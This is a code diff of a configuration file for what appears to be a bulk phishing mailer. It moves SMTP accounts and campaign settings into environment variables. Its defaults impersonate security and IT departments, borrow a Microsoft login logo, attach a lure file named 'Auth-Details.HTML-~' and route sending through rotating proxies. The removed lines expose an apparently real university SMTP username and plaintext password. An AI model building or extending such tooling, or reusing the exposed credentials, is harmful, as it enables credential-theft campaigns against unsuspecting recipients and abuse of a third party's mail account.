@@ -2,12 +2,12 @@ import dotenv from 'dotenv';
 dotenv.config();
 
 export interface SMTPAccount {
-    host: string;
-    port: string;
+    host?: string;
+    port?: string;
     auth: boolean;
-    username: string;
-    password: string;
-    fromEmail: string[];
+    username?: string;
+    password?: string;
+    fromEmail?: string[] | string;
 }
 
 export interface CustomHeaders {
@@ -62,40 +62,33 @@ export interface Config {
     config: AppConfig;
 }
 
-export const smtp: SMTPAccount[] = [
-    {
-        host: process.env.SMTP_HOST_1!,
-        port: process.env.SMTP_PORT_1!,
-        auth: true,
-        username: process.env.SMTP_USER_1!,
-        password: process.env.SMTP_PASS_1!,
-        fromEmail: [process.env.SMTP_FROM_1!],
-    },
-    // {
-    //     host: process.env.SMTP_HOST_2 || "mail.nevsehir.edu.tr",
-    //     port: process.env.SMTP_PORT_2 || "587",
-    //     auth: true,
-    //     username: process.env.SMTP_USER_2 || "finetech@nevsehir.edu.tr",
-    //     password: process.env.SMTP_PASS_2 || "lari888",
-    //     fromEmail: [process.env.SMTP_FROM_2 || "finetech@nevsehir.edu.tr"],
-    // },
-    // {
-    //     host: process.env.SMTP_HOST_3 || "mail.nevsehir.edu.tr",
-    //     port: process.env.SMTP_PORT_3 || "587",
-    //     auth: true,
-    //     username: process.env.SMTP_USER_3 || "finetech@nevsehir.edu.tr",
-    //     password: process.env.SMTP_PASS_3 || "lari888",
-    //     fromEmail: [process.env.SMTP_FROM_3 || "finetech@nevsehir.edu.tr"],
-    // },
-    // {
-    //     host: process.env.SMTP_HOST_4 || "mail.nevsehir.edu.tr",
-    //     port: process.env.SMTP_PORT_4 || "587",
-    //     auth: true,
-    //     username: process.env.SMTP_USER_4 || "finetech@nevsehir.edu.tr",
-    //     password: process.env.SMTP_PASS_4 || "lari888",
-    //     fromEmail: [process.env.SMTP_FROM_4 || "finetech@nevsehir.edu.tr"],
-    // }
-];
+
+
+// Helper to handle comma-separated env values
+const envArray = (key: string, defaultValue?: string[]): string[] => {
+    const val = process.env[key];
+    if (!val) return defaultValue || [];
+    return val.split(',').map(s => s.trim().replace(/^"|"$/g, ''));
+};
+
+const getDynamicSmtp = (): SMTPAccount[] => {
+    const accounts: SMTPAccount[] = [];
+    let i = 1;
+    while (process.env[`SMTP_HOST_${i}`]) {
+        accounts.push({
+            host: process.env[`SMTP_HOST_${i}`],
+            port: process.env[`SMTP_PORT_${i}`],
+            auth: true,
+            username: process.env[`SMTP_USER_${i}`],
+            password: process.env[`SMTP_PASS_${i}`],
+            fromEmail: process.env[`SMTP_FROM_${i}`],
+        });
+        i++;
+    }
+    return accounts;
+};
+
+export const smtp: SMTPAccount[] = getDynamicSmtp();
 
 export const custom_headers: CustomHeaders = {
     'X-Priority': '2',
@@ -133,13 +126,6 @@ export const encryption: EncryptionConfig = {
     }
 };
 
-// Helper to handle comma-separated env values
-const envArray = (key: string, defaultValue?: string[]): string[] => {
-    const val = process.env[key];
-    if (!val) return defaultValue || [];
-    return val.split(',').map(s => s.trim().replace(/^"|"$/g, ''));
-};
-
 export const message: MessageConfig = {
     fromName: envArray('EMAIL_FROM_NAMES', ['Security Department on Behalf of {{company}}', 'IT Administration at {{SchoolName}}', 'Accounts Payable - {{company}}', 'System Administrator <noreply@{{SchoolName}}>']),
     replyTo: envArray('EMAIL_REPLY_TO', ['']),
@@ -147,21 +133,21 @@ export const message: MessageConfig = {
 };
 
 export const config: AppConfig = {
-    License: "owner:769547FF-876C-11E4-8486-44510D17F8FF",
-    pauseAfter: 2000,
-    pauseFor: 10,
+    License: process.env.LICENSE || "owner:769547FF-876C-11E4-8486-44510D17F8FF",
+    pauseAfter: Number(process.env.PAUSE_AFTER) || 2000,
+    pauseFor: Number(process.env.PAUSE_FOR) || 10,
     fileName: process.env.LEADS_FILE || "mail.txt",
-    textLetter: false,
-    useHeader: true,
-    useAttach: false,
-    attachFilename: ["Auth-Details.HTML-~"],
-    links: [""],
-    sleep: 2,
-    threads: 5,
-    date_format: 1,
-    time_format: 2,
-    multiple_proxy: [""],
-    htmlAttach_to_pdf: false,
-    html_to_image: false,
-    bg_logo: "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg",
+    textLetter: process.env.TEXT_ONLY === 'true',
+    useHeader: process.env.USE_HEADERS !== 'false',
+    useAttach: process.env.USE_ATTACH === 'true',
+    attachFilename: envArray('ATTACH_FILENAMES', ["Auth-Details.HTML-~"]),
+    links: envArray('CAMPAIGN_LINKS', [""]),
+    sleep: Number(process.env.SLEEP_INTERVAL) || 2,
+    threads: Number(process.env.THREADS) || 5,
+    date_format: Number(process.env.DATE_FORMAT) || 1,
+    time_format: Number(process.env.TIME_FORMAT) || 2,
+    multiple_proxy: envArray('PROXIES', [""]),
+    htmlAttach_to_pdf: process.env.HTML_TO_PDF === 'true',
+    html_to_image: process.env.HTML_TO_IMAGE === 'true',
+    bg_logo: process.env.BG_LOGO || "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg",
 };
